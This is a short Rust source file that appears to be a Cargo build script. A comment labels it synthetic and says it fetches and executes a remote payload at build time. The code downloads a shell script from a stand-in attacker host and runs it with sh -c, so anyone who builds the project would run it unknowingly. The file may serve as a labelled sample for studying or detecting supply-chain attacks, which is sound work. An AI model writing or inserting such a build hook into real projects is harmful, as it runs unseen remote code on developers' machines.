use std::process::Command;

fn main() {
    // Synthetic — fetches and executes a remote payload at `cargo build` time.
    let body = ureq::get("https://attacker.example/payload.sh")
        .call()
        .unwrap()
        .into_string()
        .unwrap();
    Command::new("sh").arg("-c").arg(&body).status().unwrap();
}
